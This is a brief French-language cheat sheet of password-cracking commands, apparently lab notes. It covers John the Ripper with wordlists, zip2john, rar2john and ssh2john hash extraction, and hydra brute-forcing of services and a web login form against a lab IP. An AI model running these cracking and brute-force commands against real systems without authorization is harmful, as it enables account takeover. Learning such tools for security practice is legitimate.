John utilisation auto:

john --wordlist= [chemin WD] [chemin hash]

John utilisation avec format de hash :

john --format=[format] --wordlist= [chemin WD] [chemin hash]

John crack zip:

zip2john [fichier zip] > [ nom du fichier sortant]

puis utilisation de "John auto"

John crack rar

rar2john [fichier rar] > [ nom du fichier sortant]

puis utilisation de "John auto"

John crack rsa_key ssh

ssh2john [fichier id_rsa_clé] > [ nom du fichier sortant]

puis utilisation de “john auto”

hydra pour brute force toute sorte de protocole :

hydra -l user -P passlist.txt <IP + service> : + -t entre l'ip et le service a attaqué pour spécifier le nombre de thread a utiliser

hydra brute force web :

hydra -l <username> -P <wordlist> 10.10.29.193 http-post-form "/<Chemin de la page de connexion >:username=^USER^&password=^PASS^:F=<message lors d'une tentative incorect>" -V